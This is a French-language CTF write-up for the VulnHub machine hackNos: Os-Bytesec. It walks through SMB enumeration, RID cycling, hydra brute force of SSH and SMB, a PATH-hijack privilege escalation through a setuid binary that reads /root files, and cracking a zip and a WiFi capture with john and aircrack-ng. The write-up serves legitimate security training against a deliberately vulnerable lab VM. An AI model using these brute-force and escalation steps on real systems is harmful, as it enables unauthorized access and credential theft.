---
title: "Solution du CTF hackNos: Os-Bytesec de VulnHub"
tags: [CTF,VulnHub]
---

[hackNos: Os-Bytesec](https://vulnhub.com/entry/hacknos-os-bytesec,393/) est l'un des épisodes d'une série de CTFs qui ne sont... he, pas terrible.

Ils ont tendance à mélanger boot2root et Jeopardy dans un manque de réalisme gênant.

## Kansas City Shuffle

He oui nous partons directement sur la version raccourcie du CTF.

Une énumération web me sort un dossier nommé `gallery` avec différentes images :

```
200       21l      113w     1999c http://192.168.56.218/js/
200       20l       99w     1709c http://192.168.56.218/img/
200       21l      106w     1983c http://192.168.56.218/css/
200       21l      106w     1989c http://192.168.56.218/gallery/
200       15l       49w      739c http://192.168.56.218/html/
200       15l       49w      739c http://192.168.56.218/news/
403        9l       28w      279c http://192.168.56.218/icons/
```

J'ai lancé `exiftool` et `stegoveritas` sur chaque image et il n'en est rien ressorti.

Il y a un SMB en écoute sur la VM seulement aucun partage de disque ne semble présent :

```console
$ smbclient -U "" -N -L //192.168.56.218

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

L'étape suivante est généralement d'énumérer les utilisateurs. Pour cela j'ai utilisé l'outil suivant qui se veut une version revue et Pythonisée du vénérable `enum4linux.pl` :

[GitHub - cddmp/enum4linux-ng: A next generation version of enum4linux (a Windows/Samba enumeration tool) with additional features like JSON/YAML export. Aimed for security professionals and CTF players.](https://github.com/cddmp/enum4linux-ng)

```console
$  python enum4linux-ng.py -R 100 192.168.56.218
--- snip ---
  ====================================================================
|    Users, Groups and Machines on 192.168.56.218 via RID Cycling    |
 ====================================================================
[*] Trying to enumerate SIDs
[+] Found 3 SID(s)
[*] Trying SID S-1-22-1
[+] Found user 'Unix User\sagar' (RID 1000)
[+] Found user 'Unix User\blackjax' (RID 1001)
[+] Found user 'Unix User\smb' (RID 1002)
[*] Trying SID S-1-5-21-557360601-4180042360-1228881099
[+] Found user 'NITIN\nobody' (RID 501)
[+] Found domain group 'NITIN\None' (RID 513)
[*] Trying SID S-1-5-32
[+] Found builtin group 'BUILTIN\Administrators' (RID 544)
[+] Found builtin group 'BUILTIN\Users' (RID 545)
[+] Found builtin group 'BUILTIN\Guests' (RID 546)
[+] Found builtin group 'BUILTIN\Power Users' (RID 547)
[+] Found builtin group 'BUILTIN\Account Operators' (RID 548)
[+] Found builtin group 'BUILTIN\Server Operators' (RID 549)
[+] Found builtin group 'BUILTIN\Print Operators' (RID 550)
[+] Found 4 user(s), 8 group(s), 0 machine(s) in total

```

L'option `-R` permet d'utiliser la technique de RID cycling (on brute force les IDs utilisateurs). On voit donc 3 comptes Unix.

J'enchaine avec un brute force, mais sur SSH :

```console
$ hydra -u -L users.txt -P wordlists/rockyou.txt ssh://192.168.56.218:2525
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688762 login tries (l:2/p:14344381), ~1793048 tries per task
[DATA] attacking ssh://192.168.56.218:2525/
[STATUS] 280.00 tries/min, 280 tries in 00:01h, 28688482 to do in 1707:39h, 16 active
[STATUS] 311.33 tries/min, 934 tries in 00:03h, 28687828 to do in 1535:46h, 16 active
[2525][ssh] host: 192.168.56.218   login: blackjax   password: snowflake
```

Mot de passe trouvé pour `blackjax` ! On se connecte et on récupère le premier flag :

```console
blackjax@nitin:~$ ls
user.txt
blackjax@nitin:~$ cat user.txt 
  _    _  _____ ______ _____        ______ _               _____ 
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ 
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|
                                                                 
                                                                 

Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```

On nous dit d'aller vers `root`. Ce sera via les binaires setuid :

```console
blackjax@nitin:~$ find / -type f -perm -u+s -ls 2> /dev/null 
--- snip ---
   390425     36 -rwsr-xr-x   1 root     root          34680 May 17  2017 /usr/bin/newgrp
   409971      8 -rwsr-xr-x   1 root     root           7432 Nov  4  2019 /usr/bin/netscan
   390520    160 -rwsr-xr-x   1 root     root         159852 Jul  4  2017 /usr/bin/sudo
--- snip ---
```

On trouve les chaines de caractères propres au binaire ainsi que les imports au début du fichier, c'est souvent suffisant pour comprendre ce que l'exécutable fait :

```console
blackjax@nitin:~$ strings /usr/bin/netscan 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
QVhk
UWVS
t$,U
[^_]
netstat -antp
--- snip ---
```

Visiblement, il appelle `setuid` + `setgid` et `system("netstat -antp")`. On est donc sur de l'exploitation très classique décrite de nombreuses fois sur le présent blog.

Je place dans le `PATH` un programme nommé `netstat` qui sera exécuté à la place de celui attendu :

```console
blackjax@nitin:/tmp$ echo -e '#!/bin/bash\ncat /root/*.txt' > netstat
blackjax@nitin:/tmp$ chmod +x netstat 
blackjax@nitin:/tmp$ PATH=.:$PATH netscan 
    ____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __  
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /  
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/   
                     /_____/                           
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Contact : https://www.linkedin.com/in/rahulgehlaut/

WebSite : jameshacker.me
```

## Parcours touristique

Le chemin attendu était qu'on accède à un partage nommé `smb` qui, comme on a pu le voir (ou pas justement), n'est pas listé.

Pour indication, on trouvait juste ça sur le serveur web de la VM :

```
####################GET#####smb##############free
```

Si toi comprendre, toi très fort !

J'ai tout de même décidé d'approfondir s'il y avait une méthode plus cartésienne d'arriver à nos fins.

D'abord `enum4linux-ng` dispose d'une option pour énumérer les partages par force brute, seule méthode possible pour trouver un partage caché :

```console
$ python enum4linux-ng.py -s fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-small-words.txt 192.168.56.218
--- snip ---
 ============================================
|    Share Bruteforcing on 192.168.56.218    |
 ============================================
[+] Found share: printers
[+] Mapping: DENIED, Listing: N/A
[+] Found share: smb
[+] Mapping: OK, Listing: DENIED
```

Le partage `smb` découvert n'autorise pas les connexions anonymes :

```console
$ smbclient -U "" -N //192.168.56.218/smb
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

Il fallait alors utiliser le login `smb` avec un mot de passe vide. Même avec ça il n'apparaît pas dans le listing mais on peut y accéder :

```console
$ smbclient -U smb -L //192.168.56.218
Password for [WORKGROUP\smb]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
$ smbclient -U smb //192.168.56.218/smb
Password for [WORKGROUP\smb]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  4 12:50:37 2019
  ..                                  D        0  Mon Nov  4 12:37:28 2019
  main.txt                            N       10  Mon Nov  4 12:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 12:50:37 2019

                9204224 blocks of size 1024. 6758996 blocks available
```

Pour l'occasion j'ai mis à jour mon script de bruteforce des partages SMB : [GitHub - devl00p/brute_smb_share: Brute force a SMB share](https://github.com/devl00p/brute_smb_share)

On détecte désormais qu'on peut accéder au partage via le compte `smb` et mot de passe vide.

```console
$ python3 brute_smb_share.py 192.168.56.218 'smb' users.txt pass.txt 
        main.txt
        safe.zip
Success with user smb and empty password
```

Hydra est aussi capable de trouver le mot de passe vide, mais il affiche une erreur bizarre pour les autres utilisateurs et l'indication du mot de passe vide n'est pas explicite :

```console
$ hydra -u -e nsr -L users.txt -P wordlists/rockyou.txt smb://192.168.56.218
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 43033152 login tries (l:3/p:14344384), ~43033152 tries per task
[DATA] attacking smb://192.168.56.218:445/
[445][smb] Host: 192.168.56.218 Account: sagar Error: Invalid account (Anonymous success)
[445][smb] Host: 192.168.56.218 Account: blackjax Error: Invalid account (Anonymous success)
[445][smb] host: 192.168.56.218   login: smb
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Sans connaître le nom du partage `smb`, mon script fonctionne aussi sur le partage d'imprimantes :

```console
$ python3 brute_smb_share.py 192.168.56.218 'print$' users.txt pass.txt
        W32X86
        W32MIPS
        W32PPC
        x64
        WIN40
        IA64
        COLOR
Success with user smb and empty password
```

## Cap ou pas cap ?

Revenons au partage `smb`. On trouve dessus une archive zip contenant un enregistrement réseau :

```console
$ unzip -l safe.zip 
Archive:  safe.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    62471  2018-08-14 21:59   secret.jpg
  6920971  2019-11-04 07:34   user.cap
---------                     -------
  6983442                     2 files
$ unzip safe.zip 
Archive:  safe.zip
[safe.zip] secret.jpg password:
```

L'archive étant protégée par mot de passe, on génère un hash avec `zip2john`, puis on le casse :

```console
$ zip2john safe.zip > hashes.txt
$ john --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
hacker1          (safe.zip)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

L'enregistrement réseau correspond à des communications WiFi. On passe ça à `aircrack-ng` :

```bash
aircrack-ng -w rockyou.txt user.cap
```

Le mot de passe est trouvé rapidement :

```
                               Aircrack-ng 1.7 

      [00:00:03] 1552/14344390 keys tested (460.63 k/s) 

      Time left: 8 hours, 38 minutes, 57 seconds                 0.01%

                           KEY FOUND! [ snowflake ]


      Master Key     : 88 D4 8C 29 79 BF DF 88 B4 14 0F 5A F3 E8 FB FB 
                       59 95 91 7F ED 3E 93 DB 2A C9 BA FB EE 07 EA 62 

      Transient Key  : 8D 1A F1 FE 22 77 D9 C1 F1 6F 25 56 90 FB EC 2B 
                       E8 76 04 BA 24 7C 42 0F D4 90 00 5D E2 16 CF B2 
                       C8 E5 2C B9 27 97 B0 62 A5 37 22 AE EF F2 8E 46 
                       20 60 60 38 D4 D0 12 B3 92 37 77 CB 78 B4 E3 A6 

      EAPOL HMAC     : ED B5 F7 D9 56 98 B0 5E 25 7D 86 08 C4 D4 02 3D
```

On pouvait alors reprendre le chemin du SSH comme précédemment.
